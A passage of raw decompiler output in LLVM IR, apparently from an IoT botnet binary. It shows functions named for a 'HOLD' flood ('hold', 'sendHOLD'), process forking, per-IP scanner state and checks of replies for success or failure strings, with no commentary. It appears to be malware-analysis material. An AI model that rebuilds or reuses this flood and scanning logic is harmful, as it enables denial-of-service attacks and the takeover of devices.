  %v1_80513c3 = add i32 %v0_80513b9, -20
  %v2_80513c3 = inttoptr i32 %v1_80513c3 to i32*
  store i32 0, i32* %v2_80513c3, align 4
  store i32 %v2_8051368, i32* %eax.global-to-local, align 4
  %v2_80513cb = add i32 %v0_80513b9, -24
  %v3_80513cb = inttoptr i32 %v2_80513cb to i32*
  store i32 %v2_8051368, i32* %v3_80513cb, align 4
  %v1_80513cc = add i32 %v0_80513b9, -28
  %v2_80513cc = inttoptr i32 %v1_80513cc to i32*
  store i32 0, i32* %v2_80513cc, align 4
  %v0_80513ce = load i32, i32* %edx.global-to-local, align 4
  %v2_80513ce = add i32 %v0_80513b9, -32
  %v3_80513ce = inttoptr i32 %v2_80513ce to i32*
  store i32 %v0_80513ce, i32* %v3_80513ce, align 4
  %v0_80513cf = load i32, i32* %stack_var_-200, align 4
  %v2_80513cf = load i32, i32* %stack_var_-192, align 4
  %v5_80513cf = call i32 @__libc_select(i32 %v0_80513cf, i32 10000, i32 %v2_80513cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80513cf, i32* %eax.global-to-local, align 4
  %v0_80513d4 = load i32, i32* @esp, align 4
  %v12_80513da = icmp eq i32 %v5_80513cf, 1
  %v1_80513de = icmp eq i1 %v12_80513da, false
  br i1 %v1_80513de, label %dec_label_pc_8051450, label %dec_label_pc_80513e0

dec_label_pc_80513e0:                             ; preds = %dec_label_pc_805135e
  store i32 4, i32* %stack_var_-204, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_80513f0 = load i32, i32* %v4_805137d, align 8
  store i32 %v5_80513f0, i32* %edx.global-to-local, align 4
  %v2_80513fc = add i32 %v0_80513d4, 16
  %v3_80513fc = inttoptr i32 %v2_80513fc to i32*
  store i32 %v2_80513f6, i32* %v3_80513fc, align 4
  store i32 %v2_80513fd, i32* %eax.global-to-local, align 4
  %v2_8051403 = add i32 %v0_80513d4, 12
  %v3_8051403 = inttoptr i32 %v2_8051403 to i32*
  store i32 %v2_80513fd, i32* %v3_8051403, align 4
  %v1_8051404 = add i32 %v0_80513d4, 8
  %v2_8051404 = inttoptr i32 %v1_8051404 to i32*
  store i32 4, i32* %v2_8051404, align 4
  %v1_8051406 = add i32 %v0_80513d4, 4
  %v2_8051406 = inttoptr i32 %v1_8051406 to i32*
  store i32 1, i32* %v2_8051406, align 4
  %v0_8051408 = load i32, i32* %edx.global-to-local, align 4
  %v3_8051408 = inttoptr i32 %v0_80513d4 to i32*
  store i32 %v0_8051408, i32* %v3_8051408, align 4
  %v0_8051409 = load i32, i32* %stack_var_-204, align 4
  %v1_8051409 = call i32 @getsockopt(i32 %v0_8051409)
  %v0_805140e = load i32, i32* @esp, align 4
  %v3_8051411 = load i32, i32* %stack_var_-208, align 4
  %v1_8051417 = icmp eq i32 %v3_8051411, 0
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  br i1 %v1_8051417, label %dec_label_pc_8051440, label %dec_label_pc_805141b

dec_label_pc_805141b:                             ; preds = %dec_label_pc_80513e0
  %v5_8051421 = load i32, i32* %v4_805137d, align 8
  store i32 %v5_8051421, i32* %eax.global-to-local, align 4
  %v2_8051427 = add i32 %v0_805140e, 16
  %v3_8051427 = inttoptr i32 %v2_8051427 to i32*
  store i32 %v5_8051421, i32* %v3_8051427, align 4
  %v0_8051428 = load i32, i32* %stack_var_-204, align 4
  %v1_8051428 = call i32 @close(i32 %v0_8051428)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_805127d, align 4
  br label %dec_label_pc_8051521

dec_label_pc_8051440:                             ; preds = %dec_label_pc_80513e0
  store i8 2, i8* %v5_805127d, align 4
  br label %dec_label_pc_8051521

dec_label_pc_8051450:                             ; preds = %dec_label_pc_805135e
  %v13_8051450 = icmp eq i32 %v5_80513cf, -1
  %v1_8051454 = icmp eq i1 %v13_8051450, false
  br i1 %v1_8051454, label %dec_label_pc_8051521, label %dec_label_pc_805145a

dec_label_pc_805145a:                             ; preds = %dec_label_pc_8051450
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_8051460 = load i32, i32* %v4_805137d, align 8
  store i32 %v5_8051460, i32* %eax.global-to-local, align 4
  %v2_8051466 = add i32 %v0_80513d4, 16
  %v3_8051466 = inttoptr i32 %v2_8051466 to i32*
  store i32 %v5_8051460, i32* %v3_8051466, align 4
  %v1_8051467 = call i32 @close(i32 %v5_80513cf)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_805127d, align 4
  br label %dec_label_pc_8051521

dec_label_pc_805147f:                             ; preds = %dec_label_pc_805129b
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8051368, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8051490 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v3_805149e = add i32 %v2_805127d, %v2_8051222
  %v4_805149e = inttoptr i32 %v3_805149e to i32*
  %v5_805149e = load i32, i32* %v4_805149e, align 8
  %v2_80514a3 = udiv i32 %v5_805149e, 32
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_80514ac = load i32, i32* %v4_805149e, align 8
  %v1_80514af = urem i32 %v5_80514ac, 32
  store i32 %v1_80514af, i32* %eax.global-to-local, align 4
  %v0_80514b2 = load i32, i32* @ebp, align 4
  %v2_80514b2 = mul nuw nsw i32 %v2_80514a3, 4
  %v3_80514b2 = add nsw i32 %v2_80514b2, -188
  %v4_80514b2 = add i32 %v3_80514b2, %v0_80514b2
  %v5_80514b2 = inttoptr i32 %v4_80514b2 to i32*
  %v6_80514b2 = load i32, i32* %v5_80514b2, align 4
  %v9_80514b2 = shl i32 1, %v1_80514af
  %v12_80514b2 = or i32 %v6_80514b2, %v9_80514b2
  store i32 %v12_80514b2, i32* %v5_80514b2, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_80514d4 = load i32, i32* %v4_805149e, align 8
  %v1_80514d7 = add i32 %v5_80514d4, 1
  store i32 %v1_80514d7, i32* %edx.global-to-local, align 4
  %v0_80514da = load i32, i32* @esp, align 4
  %v2_80514e3 = add i32 %v0_80514da, -16
  %v3_80514e3 = inttoptr i32 %v2_80514e3 to i32*
  store i32 %v2_80513bc, i32* %v3_80514e3, align 4
  store i32 %v2_8051368, i32* %eax.global-to-local, align 4
  %v2_80514ea = add i32 %v0_80514da, -20
  %v3_80514ea = inttoptr i32 %v2_80514ea to i32*
  store i32 %v2_8051368, i32* %v3_80514ea, align 4
  %v1_80514eb = add i32 %v0_80514da, -24
  %v2_80514eb = inttoptr i32 %v1_80514eb to i32*
  store i32 0, i32* %v2_80514eb, align 4
  %v1_80514ed = add i32 %v0_80514da, -28
  %v2_80514ed = inttoptr i32 %v1_80514ed to i32*
  store i32 0, i32* %v2_80514ed, align 4
  %v0_80514ef = load i32, i32* %edx.global-to-local, align 4
  %v2_80514ef = add i32 %v0_80514da, -32
  %v3_80514ef = inttoptr i32 %v2_80514ef to i32*
  store i32 %v0_80514ef, i32* %v3_80514ef, align 4
  %v0_80514f0 = load i32, i32* %stack_var_-200, align 4
  %v2_80514f0 = load i32, i32* %stack_var_-192, align 4
  %v5_80514f0 = call i32 @__libc_select(i32 %v0_80514f0, i32 10000, i32 %v2_80514f0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80514f0, i32* %eax.global-to-local, align 4
  %v4_80514fb = icmp eq i32 %v5_80514f0, 0
  br i1 %v4_80514fb, label %dec_label_pc_8051521, label %dec_label_pc_8051501

dec_label_pc_8051501:                             ; preds = %dec_label_pc_805147f
  %v0_80514f5 = load i32, i32* @esp, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_8051507 = load i32, i32* %v4_805149e, align 8
  store i32 %v5_8051507, i32* %eax.global-to-local, align 4
  %v2_805150d = add i32 %v0_80514f5, 16
  %v3_805150d = inttoptr i32 %v2_805150d to i32*
  store i32 %v5_8051507, i32* %v3_805150d, align 4
  %v1_805150e = call i32 @close(i32 %v5_80514f0)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_805127d, align 4
  br label %dec_label_pc_8051521

dec_label_pc_8051521:                             ; preds = %dec_label_pc_80512a8, %dec_label_pc_805147f, %dec_label_pc_8051450, %dec_label_pc_805145a, %dec_label_pc_8051440, %dec_label_pc_805141b, %dec_label_pc_805134e, %dec_label_pc_8051334, %dec_label_pc_8051501
  %v4_8051521 = add nuw nsw i32 %storemerge44, 1
  store i32 %v4_8051521, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8051521, %v2_80511a8
  br i1 %exitcond, label %dec_label_pc_8051524.dec_label_pc_8051530.loopexit_crit_edge, label %dec_label_pc_8051277

dec_label_pc_8051524.dec_label_pc_8051530.loopexit_crit_edge: ; preds = %dec_label_pc_8051521
  %v0_8051530.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051530

dec_label_pc_8051530:                             ; preds = %dec_label_pc_8051524.preheader, %dec_label_pc_8051524.dec_label_pc_8051530.loopexit_crit_edge, %dec_label_pc_80511e9
  %v0_8051530 = phi i32 [ %v1_805125d, %dec_label_pc_80511e9 ], [ %v0_8051530.pre.pre, %dec_label_pc_8051524.dec_label_pc_8051530.loopexit_crit_edge ], [ %v1_805153a, %dec_label_pc_8051524.preheader ]
  %stack_var_-40.0 = phi i32 [ %tmp10, %dec_label_pc_80511e9 ], [ %v2_80511a8, %dec_label_pc_8051524.dec_label_pc_8051530.loopexit_crit_edge ], [ 0, %dec_label_pc_8051524.preheader ]
  %v1_8051533 = add i32 %v0_8051530, -16
  %v2_8051533 = inttoptr i32 %v1_8051533 to i32*
  store i32 0, i32* %v2_8051533, align 4
  %v1_8051535 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_8051535 = call i32 @__GI_time(i32* %v1_8051535)
  store i32 %v2_8051535, i32* %eax.global-to-local, align 4
  %v5_8051540 = icmp slt i32 %v2_8051535, %v5_8051260
  br i1 %v5_8051540, label %dec_label_pc_8051524.preheader, label %dec_label_pc_8051546

dec_label_pc_8051524.preheader:                   ; preds = %dec_label_pc_8051530
  %v0_805153a = load i32, i32* @esp, align 4
  %v1_805153a = add i32 %v0_805153a, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_805152a43, label %dec_label_pc_8051277, label %dec_label_pc_8051530

dec_label_pc_8051546:                             ; preds = %dec_label_pc_8051530, %entry
  %v0_8051552 = phi i32 [ %v3_80511d8, %entry ], [ %v2_8051535, %dec_label_pc_8051530 ]
  ret i32 %v0_8051552

; uselistorder directives
  uselistorder i32 %v4_8051521, { 1, 2, 0 }
  uselistorder i32 %v1_80514af, { 1, 0 }
  uselistorder i32 %v0_80513d4, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_80513cf, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805138e, { 1, 0 }
  uselistorder i32* %v4_805137d, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v12_80512ed, { 1, 0 }
  uselistorder i32 %v0_80512e8, { 2, 0, 1 }
  uselistorder i32 %v7_805127d, { 2, 1, 3, 4, 5, 6, 7, 0 }
  uselistorder i8* %v5_805127d, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge44, { 5, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 21, 20, 19, 18, 17, 16, 22, 0, 1 }
  uselistorder i32 %v2_8051368, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_805123f, { 1, 0 }
  uselistorder i32 %v2_8051222, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 5, 4 }
  uselistorder i32 %v2_8051211, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80511b6, { 1, 0 }
  uselistorder i32 %v2_80511a8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_805119a, { 1, 0, 2 }
  uselistorder i32 %v12_805118c, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-200, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-204, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %eax.global-to-local, { 53, 44, 43, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder label %dec_label_pc_8051521, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @hold(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_805155e = icmp sgt i32 %arg3, 2
  br i1 %v7_805155e, label %dec_label_pc_8051560, label %entry.dec_label_pc_8051578_crit_edge

entry.dec_label_pc_8051578_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051578

dec_label_pc_8051560:                             ; preds = %entry
  %v1_8051563 = add i32 %arg4, 12
  %v1_8051566 = inttoptr i32 %v1_8051563 to i32*
  %v2_8051566 = load i32, i32* %v1_8051566, align 4
  %v1_805156c = call i32 @atol(i32 %v2_8051566)
  store i32 %v1_805156c, i32* @eax, align 4
  %v2_8051574 = icmp slt i32 %v1_805156c, 0
  %v1_8051576 = icmp eq i1 %v2_8051574, false
  br i1 %v1_8051576, label %dec_label_pc_8051590, label %dec_label_pc_8051578

dec_label_pc_8051578:                             ; preds = %entry.dec_label_pc_8051578_crit_edge, %dec_label_pc_8051560
  %v3_8051586 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806a348.302 to i32))
  br label %dec_label_pc_805160c

dec_label_pc_8051590:                             ; preds = %dec_label_pc_8051560
  %v1_8051596 = call i32 @mfork(i32 %arg2)
  %v1_805159e = icmp eq i32 %v1_8051596, 0
  %v1_80515a0 = icmp eq i1 %v1_805159e, false
  br i1 %v1_80515a0, label %dec_label_pc_805160c, label %dec_label_pc_80515a2

dec_label_pc_80515a2:                             ; preds = %dec_label_pc_8051590
  %v1_80515a5 = add i32 %arg4, 8
  %v1_80515a8 = inttoptr i32 %v1_80515a5 to i32*
  %v1_80515ad = add i32 %arg4, 4
  %v1_80515b0 = inttoptr i32 %v1_80515ad to i32*
  %v3_80515c2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806a36c.303 to i32))
  %v2_80515d0 = load i32, i32* %v1_8051566, align 4
  %v1_80515d6 = call i32 @atol(i32 %v2_80515d0)
  store i32 %v1_80515d6, i32* @ebx, align 4
  %v2_80515e6 = load i32, i32* %v1_80515a8, align 4
  %v1_80515ec = call i32 @atol(i32 %v2_80515e6)
  %v2_80515fc = load i32, i32* %v1_80515b0, align 4
  %v0_8051601 = load i32, i32* @ebx, align 4
  %v4_8051604 = call i32 @sendHOLD(i32 %v2_80515fc, i32 %v1_80515ec, i32 %v0_8051601)
  br label %dec_label_pc_805160c

dec_label_pc_805160c:                             ; preds = %dec_label_pc_8051590, %dec_label_pc_8051578, %dec_label_pc_80515a2
  %v0_8051610 = phi i32 [ %v1_8051596, %dec_label_pc_8051590 ], [ %v3_8051586, %dec_label_pc_8051578 ], [ %v4_8051604, %dec_label_pc_80515a2 ]
  ret i32 %v0_8051610

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805160c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051578, { 1, 0 }
}

define i32 @get_ipstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_805161a = add i32 %tmp1, 4
  %v2_805161a = inttoptr i32 %v1_805161a to i32*
  %v3_805161a = load i32, i32* %v2_805161a, align 4
  %v1_8051626 = call i32 @__GI_inet_ntoa(i32 %v3_805161a)
  ret i32 %v1_8051626
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v3_8051642 = inttoptr i32 %tmp5 to i8*
  %v4_8051642 = call i32 @__GI_memset(i8* %v3_8051642, i32 0, i32 %tmp6)
  %v4_8051656 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp4, i32 %tmp5, i32 %tmp6)
  %v2_805166a = inttoptr i32 %tmp1 to i32*
  %v3_805166a = call i32 @contains_string(i32 %tmp5, i32* %v2_805166a)
  %v1_8051672 = icmp ne i32 %v3_805166a, 0
  %. = zext i1 %v1_8051672 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %tmp5, { 2, 0, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805168e = load i32, i32* @edi, align 4
  store i32 %v0_805168e, i32* %stack_var_-8, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_80516b2 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80516b9 = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_80516c6 = udiv i32 %arg1, 32
  %v1_80516cc = urem i32 %arg1, 32
  %v0_80516cf = load i32, i32* @ebp, align 4
  %v2_80516cf = mul nuw nsw i32 %v2_80516c6, 4
  %v3_80516cf = add nsw i32 %v2_80516cf, -140
  %v4_80516cf = add i32 %v3_80516cf, %v0_80516cf
  %v5_80516cf = inttoptr i32 %v4_80516cf to i32*
  %v6_80516cf = load i32, i32* %v5_80516cf, align 4
  %v9_80516cf = shl i32 1, %v1_80516cc
  %v12_80516cf = or i32 %v6_80516cf, %v9_80516cf
  store i32 %v12_80516cf, i32* %v5_80516cf, align 4
  %v1_80516da = add i32 %arg1, 1
  %v2_80516de = ptrtoint i32* %stack_var_-152 to i32
  %v5_80516f1 = call i32 @__libc_select(i32 %v1_80516da, i32 %v2_80516b2, i32 0, i32 0, i32 %v2_80516de)
  %tmp22 = icmp slt i32 %v5_80516f1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8051709, label %dec_label_pc_8051723

dec_label_pc_8051709:                             ; preds = %entry
  %v4_8051715 = call i32 @recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8051723

dec_label_pc_8051723:                             ; preds = %entry, %dec_label_pc_8051709
  %storemerge = phi i32 [ %v4_8051715, %dec_label_pc_8051709 ], [ 0, %entry ]
  %v3_8051729 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8051729, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051723, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_8051734 = icmp eq i32 %arg2, 0
  %v6_8051734 = trunc i32 %arg2 to i8
  %v1_8051738 = icmp eq i1 %v4_8051734, false
  br i1 %v1_8051738, label %entry.dec_label_pc_805174b_crit_edge, label %dec_label_pc_805173a

entry.dec_label_pc_805174b_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805174b

dec_label_pc_805173a:                             ; preds = %entry
  %v2_805173d = load i32, i32* %arg1, align 4
  %v1_8051743 = call i32 @close(i32 %v2_805173d)
  br label %dec_label_pc_805174b

dec_label_pc_805174b:                             ; preds = %entry.dec_label_pc_805174b_crit_edge, %dec_label_pc_805173a
  %v1_805174e = add i32 %tmp2, 16
  %v2_805174e = inttoptr i32 %v1_805174e to i32*
  store i32 0, i32* %v2_805174e, align 4
  %v3_805175d = add i32 %tmp2, 8
  %v4_805175d = inttoptr i32 %v3_805175d to i8*
  store i8 %v6_8051734, i8* %v4_805175d, align 1
  %v1_8051763 = add i32 %tmp2, 28
  %v2_8051763 = inttoptr i32 %v1_8051763 to i32*
  %v3_8051763 = load i32, i32* %v2_8051763, align 4
  %v3_8051771 = inttoptr i32 %v3_8051763 to i8*
  %v4_8051771 = call i32 @__GI_memset(i8* %v3_8051771, i32 0, i32 1024)
  ret i32 %v4_8051771

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805174b, { 1, 0 }
}

define i32 @reset_ipstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8051789 = inttoptr i32 %arg1 to i32*
  %v3_8051789 = call i32 @advance_state(i32* %v2_8051789, i32 0)
  %v1_8051794 = add i32 %arg1, 9
  %v2_8051794 = inttoptr i32 %v1_8051794 to i8*
  store i8 1, i8* %v2_8051794, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80517ab = call i32 @contains_string(i32 %arg1, i32* nonnull @global_var_806ff40)
  ret i32 %v3_80517ab
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_80517c6 = call i32 @contains_string(i32 %arg1, i32* bitcast ([8 x i8*]* @global_var_806fee0.318 to i32*))
  ret i32 %v4_80517c6

; uselistorder directives
  uselistorder i32 (i32, i32*)* @contains_string, { 2, 0, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80517dc = call i32 @contains_success(i32 %arg1)
  %v1_80517e4 = icmp eq i32 %v1_80517dc, 0
  %v1_80517e6 = icmp eq i1 %v1_80517e4, false
  br i1 %v1_80517e6, label %dec_label_pc_805180a, label %dec_label_pc_80517e8

dec_label_pc_80517e8:                             ; preds = %entry
  %v1_80517ee = call i32 @contains_fail(i32 %arg1)
  %v1_80517f6 = icmp ne i32 %v1_80517ee, 0
  %. = zext i1 %v1_80517f6 to i32
  br label %dec_label_pc_805180a

dec_label_pc_805180a:                             ; preds = %dec_label_pc_80517e8, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80517e8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_805180f = load i32, i32* @ebp, align 4
  store i32 %v0_805180f, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805182a

dec_label_pc_805182a:                             ; preds = %dec_label_pc_805182a, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_805182a, %dec_label_pc_805182a ]
  %v4_805182a = add i32 %stack_var_-12.0, 1
  %v2_8051830 = mul i32 %v4_805182a, 4
  %v5_8051833 = add i32 %v2_8051830, %tmp5
  %v1_8051836 = inttoptr i32 %v5_8051833 to i32*
  %v2_8051836 = load i32, i32* %v1_8051836, align 4
  %v1_8051838 = icmp eq i32 %v2_8051836, 0
  %v1_805183a = icmp eq i1 %v1_8051838, false
  br i1 %v1_805183a, label %dec_label_pc_805182a, label %dec_label_pc_805186f.preheader

dec_label_pc_805186f.preheader:                   ; preds = %dec_label_pc_805182a
  %v2_8051857 = inttoptr i32 %arg1 to i8*
  %v5_805187519 = icmp sgt i32 %v4_805182a, 0
  br i1 %v5_805187519, label %dec_label_pc_8051845.lr.ph, label %dec_label_pc_805187e

dec_label_pc_8051845.lr.ph:                       ; preds = %dec_label_pc_805186f.preheader
  br label %dec_label_pc_8051845

dec_label_pc_8051845:                             ; preds = %dec_label_pc_8051845.lr.ph, %dec_label_pc_805186c
  %storemerge120 = phi i32 [ 0, %dec_label_pc_8051845.lr.ph ], [ %v4_805186c, %dec_label_pc_805186c ]
  %v2_8051848 = mul i32 %storemerge120, 4
  %v5_805184b = add i32 %v2_8051848, %tmp5
  %v1_805184e = inttoptr i32 %v5_805184b to i32*
  %v2_805184e = load i32, i32* %v1_805184e, align 4
  store i32 %v2_805184e, i32* @eax, align 4
  %v3_8051857 = call i32 @strcasestr(i8* %v2_8051857, i32 %v2_805184e)
  %v1_805185f = icmp eq i32 %v3_8051857, 0
  br i1 %v1_805185f, label %dec_label_pc_805186c, label %dec_label_pc_805187e

dec_label_pc_805186c:                             ; preds = %dec_label_pc_8051845
  %v4_805186c = add nuw nsw i32 %storemerge120, 1
  %v5_8051875 = icmp slt i32 %v4_805186c, %v4_805182a
  br i1 %v5_8051875, label %dec_label_pc_8051845, label %dec_label_pc_805187e

dec_label_pc_805187e:                             ; preds = %dec_label_pc_8051845, %dec_label_pc_805186c, %dec_label_pc_805186f.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_805186f.preheader ], [ 0, %dec_label_pc_805186c ], [ 1, %dec_label_pc_8051845 ]
  %v2_8051881 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051881, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge120, { 1, 0 }
  uselistorder i32 %v4_805182a, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805187e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051845, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_8051897 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80518a2 = or i32 %v3_8051897, 2048
  %v3_80518b4 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v4_80518a2)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80518c5 = urem i32 %arg3, 65536
  %v1_80518ce = call i32 @htons(i32 %v1_80518c5)
  store i32 %arg2, i32* @edx, align 4
  %v3_80518e8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80518f0 = icmp eq i32 %v3_80518e8, 0
  br i1 %v1_80518f0, label %dec_label_pc_8051903, label %dec_label_pc_80518f4

dec_label_pc_80518f4:                             ; preds = %entry
  br label %dec_label_pc_8051a43

dec_label_pc_8051903:                             ; preds = %entry
  %v2_80518e0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8051911 = bitcast i32* %stack_var_-32 to i8*
  %v4_8051911 = call i32 @__GI_memset(i8* %v3_8051911, i32 0, i32 8)
  %v3_8051925 = call i32 @connect(i32 %arg1, i32 %v2_80518e0, i32 16)
  %v5_8051930 = icmp slt i32 %v3_8051925, 0
  %v1_8051934 = icmp eq i1 %v5_8051930, false
  br i1 %v1_8051934, label %dec_label_pc_8051a0a, label %dec_label_pc_805193a

dec_label_pc_805193a:                             ; preds = %dec_label_pc_8051903
  %v1_805193a = call i32 @__errno_location(i32 %v3_8051925)
  %v1_805193f = inttoptr i32 %v1_805193a to i32*
  %v2_805193f = load i32, i32* %v1_805193f, align 4
  %v9_8051941 = icmp eq i32 %v2_805193f, 115
  %v1_8051944 = icmp eq i1 %v9_8051941, false
  br i1 %v1_8051944, label %dec_label_pc_80519fe, label %dec_label_pc_805194a

dec_label_pc_805194a:                             ; preds = %dec_label_pc_805193a
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8051967 = ptrtoint i32* %stack_var_-168 to i32
  %tmp31 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8051967, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805196e = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v2_805197b = udiv i32 %arg1, 32
  %v1_8051981 = urem i32 %arg1, 32
  %v0_8051984 = load i32, i32* @ebp, align 4
  %v2_8051984 = mul nuw nsw i32 %v2_805197b, 4
  %v3_8051984 = add nsw i32 %v2_8051984, -164
  %v4_8051984 = add i32 %v3_8051984, %v0_8051984
  %v5_8051984 = inttoptr i32 %v4_8051984 to i32*
  %v6_8051984 = load i32, i32* %v5_8051984, align 4
  %v9_8051984 = shl i32 1, %v1_8051981
